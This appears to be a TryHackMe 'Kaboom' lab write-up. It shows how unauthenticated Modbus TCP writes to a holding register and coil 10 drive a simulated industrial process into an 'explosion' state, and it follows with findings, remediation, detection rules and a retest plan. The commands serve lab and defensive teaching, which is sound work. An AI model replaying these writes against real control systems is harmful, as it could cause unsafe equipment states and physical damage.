---
title: "TryHackMe: Kaboom"
date: 2026-06-27 23:58:00 +0200
categories: [TryHackMe]
tags:
  - ot
  - ics
  - modbus
  - plc
  - industrial-control
  - cctv
  - process-manipulation
description: >-
  Kaboom demonstrates how unauthenticated Modbus TCP write access and weak
  process-state validation can be chained into direct manipulation of a
  simulated OT process and retrieval of the final challenge evidence.
author: lenovolegion7
media_subpath: /images/tryhackme_kaboom
image:
  path: room_image.webp
  alt: "Original TryHackMe Kaboom room artwork"
toc: true
comments: false
---

Kaboom is an OT/ICS-focused challenge built around Modbus TCP process manipulation. The validated path required no SSH, OpenPLC, or Node-RED authentication: direct access to the exposed Modbus interface was enough to change process state, trigger the simulated incident condition, and retrieve the final challenge evidence from the CCTV simulator.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Kaboom room card](room_card.webp){: w="298" h="270" .shadow }](https://tryhackme.com/room/kaboom){: .center }

## Executive Summary

The target exposed a simulated OT environment with multiple industrial and management services:

```text
22/tcp     SSH
80/tcp     PLC CCTV simulator
102/tcp    Siemens S7 / ISO-TSAP
502/tcp    Modbus TCP
1880/tcp   Node-RED
8080/tcp   OpenPLC
44818/tcp  EtherNet/IP
```

The critical weakness was unauthenticated Modbus TCP write access.

A controlled write to holding register `0` changed the simulated process into a high-temperature state. A subsequent write to coil `10` changed the simulator to:

```text
Explosion Detected!
```

The CCTV application then exposed an incident video mode from which the final objective was recovered.

> **Result:** Unauthenticated Modbus writes were sufficient to manipulate process state and trigger the simulated industrial incident.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe lab.

The documented actions directly manipulated simulated OT process state. Equivalent activity against production industrial environments could create unsafe equipment states or physical impact and requires explicit authorization, engineering review, and safety controls.

## Initial Enumeration

The external host can be represented without publishing its lab address:

```console
$ nmap \
  -p22,80,102,502,1880,8080,44818 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

The following services were observed:

```text
OpenSSH
PLC CCTV simulator
Siemens S7
Modbus TCP
Node-RED
OpenPLC
EtherNet/IP
```

The Modbus interface on port `502` permitted unauthenticated reads and writes.

## Process-State Observation

The CCTV simulator exposed current state through:

```console
$ curl -s http://TARGET_IP/api/state
```

The normal state included:

```text
Cooling OFF, Low Temperature
```

This endpoint provided immediate feedback about changes made through Modbus.

## Controlled Modbus Register Manipulation

A controlled write to holding register `0` demonstrated that process values could be changed without authentication:

```console
$ python3 ics/modbus_write_one.py \
  TARGET_IP \
  reg 0 9999 1
```

The simulator responded with:

```text
High Temperature, Cooling ON
```

Other values also produced unsafe or undefined states. Setting register `0` to `0`, for example, resulted in:

```text
Unknown State
```

This showed that both access control and process-state validation were weak.

## Incident Trigger Through Coil 10

From a valid high-temperature baseline, coil testing identified coil `10` as the incident trigger.

The final controlled write was:

```console
$ python3 ics/modbus_write_one.py \
  TARGET_IP \
  coil 10 true 1
```

The resulting process state became:

```text
Explosion Detected!
```

The CCTV simulator selected the incident video mode:

```text
explodedflag23
```

## Evidence Retrieval

The incident video was then downloaded from the simulator:

```console
$ wget \
  'http://TARGET_IP/video?mode=explodedflag23' \
  -O explodedflag23.mp4
```

Frames were extracted:

```console
$ ffmpeg \
  -i explodedflag23.mp4 \
  -vf fps=1 \
  frames/frame_%03d.png
```

The challenge flag was visible in the video overlay and is intentionally published only as:

```text
THM{[REDACTED]}
```

## Findings

### KAB-01 - Unauthenticated Modbus Write Access

- **Severity:** Critical
- **Affected service:** Modbus TCP / 502
- **Impact:** Remote process manipulation without credentials

The target accepted Modbus write operations without authentication or authorization controls.

Observed effects included:

```text
holding register 0 = 9999
-> High Temperature, Cooling ON

coil 10 = TRUE
-> Explosion Detected!
```

**Remediation:**

- restrict Modbus TCP to allowlisted engineering systems;
- block direct Modbus access from user, DMZ, monitoring, and external networks;
- enforce segmentation with industrial firewalls;
- log and alert on write function codes;
- implement process-level interlocks that do not rely solely on network trust.

### KAB-02 - Unsafe Process-State Validation

- **Severity:** High
- **Impact:** Out-of-range and invalid values produced unsafe or undefined process states

The simulator accepted values outside a safe engineering range.

Observed behavior included:

```text
initial state:
Cooling OFF, Low Temperature

register 0 = 0:
Unknown State

register 0 = 90 or 9999:
High Temperature, Cooling ON

coil 10 = TRUE:
Explosion Detected!
```

**Remediation:**

- define valid engineering ranges for every register;
- reject out-of-range values;
- use safe fallback states;
- implement independent interlocks;
- require operator confirmation for hazardous transitions where appropriate.

### KAB-03 - Public Process Telemetry and Video Disclosure

- **Severity:** Medium
- **Affected endpoints:** `/api/state`, `/video?mode=`
- **Impact:** External validation of process manipulation and retrieval of incident evidence

The CCTV application exposed process state and incident video modes without authentication.

**Remediation:**

- require authentication for telemetry and CCTV endpoints;
- avoid exposing raw internal state identifiers;
- place visualization behind an authenticated OT operations interface;
- separate read-only visualization systems from control networks.

### KAB-04 - Broad Exposure of OT and Management Services

- **Severity:** Medium
- **Affected services:** S7, EtherNet/IP, Node-RED, OpenPLC, Modbus
- **Impact:** Increased attack surface against industrial and management components

Multiple industrial and management services were reachable from the same assessment network.

**Remediation:**

- disable unused services;
- restrict engineering interfaces to management zones;
- require strong authentication and RBAC for Node-RED and OpenPLC;
- implement Purdue-style network segmentation;
- use jump hosts for engineering access.

## Security Impact

In a real OT deployment, unauthenticated process-control writes could create consequences far beyond application compromise.

Potential impact includes:

- process instability;
- unsafe equipment conditions;
- production downtime;
- physical equipment damage;
- alarm manipulation;
- degraded operator visibility;
- safety-system stress.

The lab demonstrated the central issue clearly: network reachability to a writable Modbus endpoint was effectively equivalent to process-control authority.

## Detection Opportunities

Useful monitoring controls include:

- alert on Modbus FC5, FC6, FC15, and FC16 writes from non-engineering hosts;
- correlate Modbus writes with operator activity;
- detect sudden transitions to high-temperature or incident states;
- monitor repeated `/api/state` requests immediately after control writes;
- alert on unauthorized changes to Node-RED or PLC configuration;
- baseline expected OT communication pairs.

## Remediation Priorities

1. Restrict Modbus TCP/502 to approved engineering systems.
2. Block unauthenticated writes from untrusted segments.
3. Implement PLC-side range validation and safety interlocks.
4. Authenticate CCTV and process telemetry.
5. Harden or disable unused Node-RED and OpenPLC services.
6. Segment OT networks using industrial firewalls and jump hosts.
7. Monitor Modbus write function codes.
8. Add change-control and alerting for PLC and flow modifications.

## Retest Plan

1. Verify untrusted hosts cannot connect to Modbus TCP.
2. Confirm unauthorized write function codes are blocked.
3. Verify out-of-range register values are rejected.
4. Confirm invalid coil transitions do not produce hazardous states.
5. Verify `/api/state` requires authorization.
6. Confirm sensitive video modes cannot be retrieved anonymously.
7. Verify Node-RED and OpenPLC management interfaces are restricted.
8. Confirm OT segmentation prevents direct access from non-engineering networks.

## Lessons Learned

Kaboom demonstrates a fundamental OT security principle: industrial protocols that assume trusted networks must not be exposed to untrusted clients without compensating controls.

The successful path did not require exploitation of SSH, OpenPLC, or Node-RED. The process-control interface itself provided enough authority to change the plant state.

The most important defensive measures are therefore segmentation, strict control of Modbus writes, engineering-range validation, independent safety interlocks, and authenticated monitoring interfaces.
